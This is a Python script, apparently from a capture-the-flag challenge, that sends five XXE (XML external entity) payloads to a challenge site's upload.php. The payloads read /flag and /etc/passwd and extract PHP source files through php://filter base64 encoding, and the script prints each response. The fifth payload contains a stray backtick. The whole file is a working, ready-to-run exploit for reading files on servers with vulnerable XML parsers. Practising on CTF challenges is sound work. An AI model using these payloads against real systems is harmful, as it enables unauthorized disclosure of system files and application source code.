import requests

url = 'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/upload.php'

# 测试各种 XXE payload
xxe_payloads = [
    # 1. 基本 XXE
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
    <data>&xxe;</data>""",

    # 2. 读取 /etc/passwd
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data>&xxe;</data>""",

    # 3. 读取 flag.php 源码
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php"> ]>
    <data>&xxe;</data>""",

    # 4. 读取 upload.php 源码
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=upload.php"> ]>
    <data>&xxe;</data>""",

    # 5. 读取 dashboard.php 源码
    """<?xml version="1.0"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=dashboard.php">` ]>
    <data>&xxe;</data>""",
]

for i, payload in enumerate(xxe_payloads, 1):
    print(f"\n=== Testing payload {i} ===")
    print(f"Payload: {payload[:100]}...")

    headers = {'Content-Type': 'application/xml'}
    try:
        resp = requests.post(url, data=payload, headers=headers, timeout=5)
        print(f"Status: {resp.status_code}")
        print(f"Response: {resp.text[:500]}")
    except Exception as e:
        print(f"Error: {e}")
